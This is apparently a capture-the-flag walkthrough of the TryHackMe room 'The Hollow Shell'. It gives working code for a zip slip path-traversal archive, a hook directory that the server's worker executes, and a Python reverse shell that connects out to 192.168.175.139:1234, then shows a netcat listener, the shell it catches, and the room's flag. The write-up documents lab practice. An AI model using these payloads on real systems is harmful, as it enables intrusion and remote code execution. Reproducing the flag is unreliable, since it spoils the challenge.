# [The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)

 - Day 10 of Hacker Holiday's , Today we are dealing with a web based challenge . 
 
 ![screenshot](../data/hs1.png)

- Start the machine, we get a url . visti the url in the browser.
- Start your web proxy too, so it records every request while you navigating the site.
- Well when i try to vist the url i got nothing. so i decided to perform a nmap scan.

 ![screenshot](../data/hs2.png)

 - Fount an open port in the namp scan.
 ```
 nmap -sC -sV -p 22,5000 10.48.164.215                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-07 10:22 +0530
Nmap scan report for 10.48.164.215
Host is up (0.094s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6f:b3:c2:c3:23:6e:fc:f4:ca:96:62:be:eb:2b:8b:03 (ECDSA)
|_  256 69:18:6d:18:1a:ad:af:f6:2b:e2:d3:36:56:eb:1a:85 (ED25519)
5000/tcp open  http    Gunicorn
| http-title: Byte Lotus \xE2\x80\x94 Room Service
|_Requested resource was /login
|_http-server-header: gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds
```
- A web server is running on port 5000.

![screenshot](../data/hs3.png)

- It is a login portal and the source code revelaead a starter credentials.

![screenshot](../data/hs4.png)
![screenshot](../data/hs5.png)

- The site has a upload funtionality it takes a zip archive, that zip must contina a shell.json manifest listing: a name and a set of assets like images or stylesheets etc. 
- so for intial testing i created a json file shell.json
```
{
	"name":"test",
	"assets":[]
}
```
```
zip test.zip shell.json 
  adding: shell.json (stored 0%)
```
- Now upload the test.zip 
![screenshot](../data/hs6.png)

- the file is uploaded to **shells/4608a8ce7f95/**.
![screenshot](../data/hs7.png)
- Our shell.json was uploded successfully . 
- well the next thing i want to try weather i can do a path traversal to get a arbitary file write to any other directory. This is called [zip slip](https://security.snyk.io/research/zip-slip-vulnerability) vulnarability.
- Ok for test this , i want to create a archive that has path traversal sequesnce(../), but normal zip tools block this so we have to write our own code for this 
```
cat > zipslip.py << 'EOF'
import zipfile
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('shell.json', '{"name": "testing zipslip", "assets": []}')
zf.writestr('../zippyslippy.txt', 'spiderman')
zf.close()
EOF
python3 zipslip.py
```

- After executing the above python code now we have a zipslip.zip file lets upload to see weather we can perform a zip slip attack or not. 
![screenshot](../data/hs9.png)

- As we can see our zippyslippy.txt has uploaded to shells directory, but i cant read the file it says file not found , lets try to write to a directory like /static
```
cat > zipslip.py << 'EOF'
import zipfile
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('shell.json', '{"name": "testing zipslip", "assets": []}')
zf.writestr('../../static/zippyslippy.txt', 'spiderman')
zf.close()
EOF

python3 zipslip.py
```
- after uploading the zip file try to visit the /static/zippyslippy.txt endpoint. we succesfully performed zip slip vulnerability.

![screenshot](../data/hs11.png)

- now what? , we have to find a way to make this file write vulnerability to a RCE. how to do that. 

![screenshot](../data/hs10.png)

- If we closely observe the description says the shell may includes automation hooks . The automated hooks are automatically executed by the baground worker . if we able to find the directory that is watched by the worker , if we place a malicious python file(as the backend is using python) into that directory the worker may execute it.
- It's time to put our theory to test.
- **Finding the directory that watched by the worker for automated hooks . i tried /hooks and it worked.**
- I had my json and malisious python scrip are ready.
```
cat shell.json 
{
	"name":"RCE",
	"assets":[],
	"hooks":[]
}%                                                   
```
```
 cat rev.py 
import os
import pty
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.175.139", 1234))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/bash")%                          
```
- Now the python script to make a zip file.

```
cat > RCE.py << 'EOF'
import zipfile
zf = zipfile.ZipFile('RCE.zip', 'w')
zf.writestr('shell.json', open('shell.json').read())
zf.writestr('../../hooks/rev.py', open('rev.py').read())
zf.close()
EOF

python3 RCE.py
```                            
- Now upload the zip file before that start a netcat listener.
```
nc -lnvp 1234
```
- After few seconds i have got the rev shell.
```
~/TryHackMe/Hackers_holiday ❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.175.139] from (UNKNOWN) [10.49.156.113] 34474
roomservice@tryhackme-2404:/var/www/conch$ 
```
- In the users home directory you can find flag.txt

```
cat flag.txt 
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```
**Flag: THM{z1p_sl1pp3d_1nt0_a_sh3ll}